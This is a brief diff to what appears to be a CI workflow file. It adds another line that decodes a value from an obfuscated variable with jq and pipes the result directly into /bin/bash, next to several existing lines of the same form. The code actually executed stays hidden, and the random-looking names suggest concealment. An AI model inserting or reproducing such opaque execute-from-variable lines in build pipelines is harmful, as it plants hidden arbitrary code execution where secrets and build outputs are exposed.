@@ -22,6 +22,7 @@ jobs:
           echo $cgdir0 | jq -r .m16 | /bin/bash
           echo $snsii0 | jq -r .oyvt9 | /bin/bash
           printf '%s' "$ygwc103" | jq -r .agk3 | /bin/bash
+          echo $khpdc37078 | jq -r .mrnu99 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
